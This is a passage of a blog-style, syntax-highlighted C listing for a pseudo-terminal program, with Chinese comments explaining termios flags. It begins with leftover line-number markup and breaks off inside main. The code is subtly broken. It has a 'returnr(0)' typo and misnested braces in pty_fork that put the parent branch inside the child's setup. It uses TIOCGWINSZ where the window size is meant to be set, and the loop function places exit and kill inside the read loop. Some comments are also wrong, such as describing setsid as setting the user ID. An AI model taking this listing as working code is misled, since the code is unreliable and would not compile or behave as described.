class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;termio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> LINUX</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OPTSTR <span class="hljs-string">&quot;+d:eiv&quot;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OPTSTR <span class="hljs-string">&quot;d:einv&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> </span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">set_noecho</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">do_driver</span><span class="hljs-params">(<span class="hljs-type">char</span> *)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">loop</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>)</span>;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> optind, opterr, optopt;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> *optarg;<br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">ptym_open</span><span class="hljs-params">(<span class="hljs-type">char</span> *pts_name, <span class="hljs-type">int</span> pts_namesz)</span><br>&#123;<br>    <span class="hljs-type">char</span> *ptr;<br>    <span class="hljs-type">int</span> fdm, err;<br><br>    <span class="hljs-keyword">if</span> ((fdm = posix_openpt(O_RDWR)) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//打开pty设备</span><br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">if</span> (grantpt(fdm) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//授予访问从设备的权限</span><br>        <span class="hljs-keyword">goto</span> errout; <br>    <span class="hljs-keyword">if</span> (unlockpt(fdm) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//解锁从设备</span><br>        <span class="hljs-keyword">goto</span> errout;<br>    <span class="hljs-keyword">if</span> ((ptr = ptsname(fdm)) == <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//获取从设备路径</span><br>        <span class="hljs-keyword">goto</span> errout;<br>    <br>    <span class="hljs-built_in">strncpy</span>(pts_name, ptr, pts_namesz); <span class="hljs-comment">//存放从设备的路径</span><br>    pts_name[pts_namesz - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    <span class="hljs-keyword">return</span>(fdm);<br><br>errout:<br>    err = errno;<br>    close(fdm);<br>    errno = err;<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">ptys_open</span><span class="hljs-params">(<span class="hljs-type">char</span> *pts_name)</span><br>&#123;<br>    <span class="hljs-type">int</span> fds;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(SOLARIS)</span><br>    <span class="hljs-type">int</span> err, setup;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">if</span> ((fds = open(pts_name, O_RDWR)) &lt; <span class="hljs-number">0</span>) <br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(SOLARIS)</span><br>    <span class="hljs-keyword">if</span> ((setup = ioctl(fds, I_FIND, <span class="hljs-string">&quot;ldterm&quot;</span>)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">goto</span> errout;<br>    <br>    <span class="hljs-keyword">if</span> (setup == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (ioctl(fds, I_PUSH, <span class="hljs-string">&quot;pterm&quot;</span>) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">goto</span> errout;<br>        <span class="hljs-keyword">if</span> (ioctl(fds, I_PUSH, <span class="hljs-string">&quot;ldterm&quot;</span>) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">goto</span> errout;<br>        <span class="hljs-keyword">if</span> (ioctl(fds, I_PUSH, <span class="hljs-string">&quot;ttcompat&quot;</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>errout:<br>    err = errno;<br>    close(fds);<br>    errno = err;<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">return</span>(fds);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">termios</span> <span class="hljs-title">save_termios</span>;</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> ttysavefd = <span class="hljs-number">-1</span>;<br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">enum</span>&#123;</span> RESET, RAW, CBREAK&#125; ttystate = RESET;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">tty_cbreak</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span> <span class="hljs-comment">//设置非规范模式</span><br>&#123;<br>    <span class="hljs-type">int</span> err;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">termios</span> <span class="hljs-title">buf</span>;</span><br><br>    <span class="hljs-keyword">if</span> (ttystate != RESET)<br>    &#123;<br>        errno = EINVAL;<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (tcgetattr(fd, &amp;buf) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    save_termios = buf;<br>    buf.c_lflag &amp;= ~(ECHO | ICANON); <span class="hljs-comment">//ICANON是一个标志，用于控制是否以规范模式处理输入</span><br><br>    buf.c_cc[VMIN] = <span class="hljs-number">1</span>; <span class="hljs-comment">//要求读取的最小字符数</span><br>    buf.c_cc[VTIME] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (tcsetattr(fd, TCSAFLUSH, &amp;buf) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    <br>    <span class="hljs-keyword">if</span> (tcgetattr(fd, &amp;buf) &lt; <span class="hljs-number">0</span>) &#123;<br>        err = errno;<br>        tcsetattr(fd, TCSAFLUSH, &amp;save_termios);<br>        errno = err;<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((buf.c_cflag &amp; (ECHO | ICANON)) || buf.c_cc[VMIN] != <span class="hljs-number">1</span> ||<br>    buf.c_cc[VTIME] != <span class="hljs-number">0</span>) &#123;<br>        tcsetattr(fd, TCSAFLUSH, &amp;save_termios);<br>        errno = EINVAL;<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    ttystate = CBREAK;<br>    ttysavefd = fd;<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">tty_raw</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">int</span> err;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">termios</span> <span class="hljs-title">buf</span>;</span><br><br>    <span class="hljs-keyword">if</span> (ttystate != RESET) &#123;<br>        errno = EINVAL;<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (tcgetattr(fd, &amp;buf) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    save_termios = buf;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        启用IEXTEN后，可以实现特定的输入处理扩展功能</span><br><span class="hljs-comment">        启用ISIG后，终端驱动程序将对一些特殊字符做出响应，例如Ctrl-C和Ctrl-Z等信号字符。这些信号字符可以用于通知正在运行的程序或shell执行特定的操作或响应事件。</span><br><span class="hljs-comment">    */</span><br>    buf.c_lflag &amp;= ~(ECHO | ICANON | IEXTEN | ISIG);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        启用BRKINT后，当终端接收到中断信号（通常是Ctrl-C）或结束信号（通常是Ctrl-D）时，终端驱动程序将发送一个中断信号给正在运行的进程</span><br><span class="hljs-comment">        启用ICRNL后，输入回车字符（\r）将被翻译为新行字符（\n）</span><br><span class="hljs-comment">        启用INPCK后，输入数据将进行奇偶校验</span><br><span class="hljs-comment">        启用ISTRIP后，输入数据的高位（最高位）将被丢弃，只保留低7位。这通常被称为&quot;字符剥离&quot;（character stripping），可用于去除输入数据中的奇怪字符或无用信息</span><br><span class="hljs-comment">        启用IXON后，终端驱动程序将为输出数据中的暂停字符（通常是Ctrl-S）和重新开始字符（通常是Ctrl-Q）启用软件流控制。</span><br><span class="hljs-comment">    */</span><br>    buf.c_iflag &amp;= ~(BRKINT | ICRNL | INPCK | ISTRIP | IXON);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        它用于设置终端数据位的大小。CSIZE通常与另外两个标志CSTOPB和PARODD一起使用，以确定终端设备的通信参数。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        CSIZE标志有三个可能的值：CS5、CS6、CS7和CS8。分别代表使用5、6、7或8位作为数据位。选择使用哪个值通常取决于具体的使用情况和需求。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        需要注意的是，CSIZE标志只是终端设置中的一部分。要正确设置终端设备的通信参数，需要考虑其他设置标志，如波特率、停止位和奇偶校验等。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        启用PARENB后，终端驱动程序将启用奇偶校验功能，并在输出数据和输入数据中添加奇偶校验位   </span><br><span class="hljs-comment">    */</span><br>    buf.c_cflag &amp;= ~(CSIZE | PARENB);<br><br>    buf.c_cflag |= CS8;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        启用OPOST后，终端驱动程序将对输出数据进行后处理，以便在发送给终端设备之前进行转换和修改。</span><br><span class="hljs-comment">    */</span><br>    buf.c_oflag &amp;= ~(OPOST);<br><br>    buf.c_cc[VMIN] = <span class="hljs-number">1</span>;<br>    buf.c_cc[VTIME] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (tcsetattr(fd, TCSAFLUSH, &amp;buf) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">if</span> (tcgetattr(fd, &amp;buf) &lt; <span class="hljs-number">0</span>) &#123;<br>        err = errno;<br>        tcsetattr(fd, TCSAFLUSH, &amp;save_termios);<br>        errno = err;<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((buf.c_lflag &amp; (ECHO | ICANON | IEXTEN | ISIG)) ||<br>    (buf.c_iflag &amp; (BRKINT | ICRNL | INPCK | ISTRIP | IXON)) ||<br>    (buf.c_cflag &amp; (CSIZE | PARENB | CS8)) != CS8 ||<br>    (buf.c_oflag &amp; OPOST) || buf.c_cc[VMIN] != <span class="hljs-number">1</span> ||<br>    buf.c_cc[VTIME] != <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//检查是否将标志位删除</span><br>        tcsetattr(fd, TCSAFLUSH, &amp;save_termios);<br>        errno = EINVAL;<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    ttystate = RAW;<br>    ttysavefd = fd;<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">tty_reset</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (ttystate == RESET)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (tcsetattr(fd, TCSAFLUSH, &amp;save_termios) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    ttystate = RESET;<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">tty_atexit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (ttysavefd &gt;= <span class="hljs-number">0</span>)<br>        tty_reset(ttysavefd);<br>&#125;<br><br><span class="hljs-keyword">struct</span> termios *<br><span class="hljs-title function_">tty_termios</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span>(&amp;save_termios);<br>&#125;<br><br><br><span class="hljs-type">pid_t</span> <br><span class="hljs-title function_">pty_fork</span><span class="hljs-params">(<span class="hljs-type">int</span> *ptrfdm, <span class="hljs-type">char</span> *slave_name, <span class="hljs-type">int</span> slave_namesz,</span><br><span class="hljs-params">        <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> termios *slave_termios,</span><br><span class="hljs-params">        <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> winsize *slave_winsize)</span><br>&#123;<br>    <span class="hljs-type">int</span> fdm, fds;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">char</span> pts_name[<span class="hljs-number">20</span>];<br><br>    <span class="hljs-keyword">if</span> ((fdm = ptym_open(pts_name, <span class="hljs-keyword">sizeof</span>(pts_name))) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//打开主设备，会将从设备路径存放在pts_name</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t open master pty: %s, error %d&quot;</span>, pts_name, fdm);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (slave_name != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">strncpy</span>(slave_name, pts_name, slave_namesz);<br>        slave_name[slave_namesz - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//子进程</span><br>        <span class="hljs-keyword">if</span> (setsid() &lt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//设置进程的用户ID</span><br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;setsid error&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((fds = ptys_open(pts_name)) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//打开从设备</span><br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t open slave pty&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        close(fdm);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(BSD)</span><br>    <span class="hljs-keyword">if</span> (ioctl(fds, TIOCSCTTY, (<span class="hljs-type">char</span> *)<span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;TIOCSCTTY error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>        <span class="hljs-keyword">if</span> (slave_termios != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">if</span> (tcsetattr(fds, TCSANOW, slave_termios) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//终端的行为</span><br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;tcsetattr error on slave pty&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (slave_winsize != <span class="hljs-literal">NULL</span>) &#123;<br>                <span class="hljs-keyword">if</span> (ioctl(fds, TIOCGWINSZ, slave_winsize) &lt; <span class="hljs-number">0</span>)<br>                &#123;<br>                    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;TIOCSWINSZ error on slave pty&quot;</span>);<br>                    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (dup2(fds, STDIN_FILENO) != STDIN_FILENO)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;dup2 error to stdin&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (dup2(fds, STDOUT_FILENO) != STDOUT_FILENO)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;dup2 error to stdout&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (dup2(fds, STDERR_FILENO) != STDERR_FILENO)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;error to stderr&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (fds != STDIN_FILENO &amp;&amp; fds != STDOUT_FILENO &amp;&amp; fds != STDERR_FILENO)<br>                close(fds);<br>            returnr(<span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            *ptrfdm = fdm;<br>            <span class="hljs-keyword">return</span>(pid);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFFSIZE 512</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">sig_term</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<br><span class="hljs-type">static</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">sig_atomic_t</span> sigcaught;<br><br><span class="hljs-type">void</span> <br><span class="hljs-title function_">loop</span><span class="hljs-params">(<span class="hljs-type">int</span> ptym, <span class="hljs-type">int</span> ignoreeof)</span><br>&#123;<br>    <span class="hljs-type">pid_t</span> child;<br>    <span class="hljs-type">int</span> nread;<br>    <span class="hljs-type">char</span> buf[BUFFSIZE];<br><br>    <span class="hljs-keyword">if</span> ((child = fork()) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fork error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (child == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">for</span> ( ; ; ) &#123;<br>            <span class="hljs-keyword">if</span> ((nread = read(STDIN_FILENO, buf, BUFFSIZE)) &lt; <span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;read error from stdin&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">if</span> (writen(ptym, buf, nread) != nread) <span class="hljs-comment">//写入pty设备</span><br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;write error to master pty&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (ignoreeof == <span class="hljs-number">0</span>)<br>                kill(getppid(), SIGTERM);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (signal_intr(SIGTERM, sig_term) == SIG_ERR)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;signal_intr error for SIGTERM&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> ( ; ;) &#123;<br>            <span class="hljs-keyword">if</span> ((nread = read(ptym, buf, BUFFSIZE)) &lt;= <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">if</span> (writen(STDOUT_FILENO, buf, nread) != nread)<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;writen error to stdout&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (sigcaught == <span class="hljs-number">0</span>)<br>            kill(child, SIGTERM);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <br><span class="hljs-title function_">sig_term</span><span class="hljs-params">(<span class="hljs-type">int</span> signo)</span><br>&#123;<br>    sigcaught = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">int</span> fdm, c, ignoreeof, interactive, noecho, verbose;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">char</span> *driver;<br>    <span class="hljs-type">char</span> slave_name[<span class="hljs-number">20</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">termios</span> <span class="hljs-title">orig_termios</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">winsize</span> <span class="hljs-title">size</span>;</span><br><br>    interactive = isatty(STDIN_FILENO);<br>    ignoreeof = <span class="hljs-number">0</span>;<br>    noecho = <span class="hljs-number">0</span>;<br>    verbose = <span class="hljs-number">0</span>;<br>    driver = <span class="hljs-literal">NULL</span>;<br><br>    opterr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ((c = getopt(argc, argv, OPTSTR)) != EOF) &#123; <span class="hljs-comment">//+号的意思是将参数存储在optarg中</span><br>        <span class="hljs-keyword">switch</span> (c)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-comment">/* constant-expression */</span><br>            <span class="hljs-string">&#x27;d&#x27;</span>:<br>            driver = optarg;<br>            <span class="hljs-keyword">break</span>;<br>            <span class="hljs-comment">/* code */</span><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;e&#x27;</span>:<br>                noecho = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;i&#x27;</span>:<br>                ignoreeof = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;n&#x27;</span>:<br>                interactive = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>:<br>                verbose = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">break</span>;<br>                <span class="hljs-comment">//若getopt的参数不能识别或缺少参数则会返回？</span><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;?&#x27;</span>: <br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;unrecognized option: -%c&quot;</span>, optopt);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (optind &gt;= argc)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage: pty [ -d driver -einv ] program [ arg ... ]&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (interactive) &#123;<br>        <span class="hljs-keyword">if</span> (tcgetattr(STDIN_FILENO, &amp;orig_termios) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//获取与终端相关的的参数</span><br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;tcgetattr error on stdin&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ioctl(STDIN_FILENO, TIOCGWINSZ, (<span class="hljs-type">char</span> *)&amp;size) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;TIOCGWINSZ error&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        pid = pty_fork(&amp;fdm, slave_name, <span class="hljs-keyword">sizeof</span>(slave_name),<br>            &amp;orig_termios, &amp;size);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        pid = pty_fork(&amp;fdm, slave_name, <span class="hljs-keyword">sizeof</span>(slave_name), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span 